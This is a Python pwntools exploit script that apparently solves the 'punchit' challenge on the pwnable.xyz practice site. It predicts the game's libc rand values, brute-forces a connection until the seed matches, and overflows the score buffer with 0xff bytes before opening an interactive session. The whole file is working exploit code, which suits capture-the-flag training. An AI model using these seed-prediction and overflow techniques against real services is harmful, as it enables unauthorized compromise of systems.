from pwn import *
from ctypes import CDLL

context.terminal = ["alacritty", "-e", "sh", "-c"]

exe = ELF("patched-punchit")
libc = CDLL("libc.so.6")

BASE = 0x2c

def get_full(num):
    ct = 0
    while num & 0xff:
        ct += 1
        num >>= 0x8
    return ct


def init(r):
    r.recvuntil(": ")
    r.sendline("y")
    r.recvuntil("Name: ")
    r.sendline("A" * 0x2b)
    r.recvuntil("> ")
    r.sendline("2")


def game(r, push, over, score):
    for _ in range(push):
        r.recvuntil("> ")
        r.sendline(str(libc.rand() + 1))
        score += 1
    r.sendline(str(libc.rand()))
    r.recvuntil("[N/y]")
    r.sendline(b"y" + b"\xff" * (BASE + over))
    mask = 0xff
    for _ in range(over):
        score |= mask
        mask <<= 0x8
    return score



def bf_seed():
    ct = 1
    while True:
        log.info("Attempt #{}...".format(ct))
        # r = process(exe.path)
        r = remote("svc.pwnable.xyz", 30024)
        # gdb.attach(r)
        libc.srand(0x81)
        init(r)
        r.recvuntil("> ")
        r.sendline(str(libc.rand()))
        res = r.recvline().strip().decode()
        if res == "draw":
            log.success("Seed found after {} attempts".format(ct))
            return r
        r.close()
        ct += 1


def main():
    r = bf_seed()
    # gdb.attach(r)

    r.recvuntil("[N/y]")
    r.sendline("n")

    score = 0

    score = game(r, 1, 1, score)
    log.info("Initiating greedy strategy...")
    # Optimal solution is to add 2, then overwrite as many bytes as possible, until
    # we reach n * 2 digits of 0xf
    for i in range(2, 9):
        log.info("Trying {} bytes...".format(i))
        while True:
            score = game(r, 2, get_full(score + 2), score)
            log.info(hex(score))
            if score == 16 ** (i * 2) - 1:
                break
        log.success("Score is now {} bytes long.".format(i))
    log.success("Greedy strategy complete.")

    r.recvuntil("> ")
    r.sendline("0")

    r.interactive()


main()
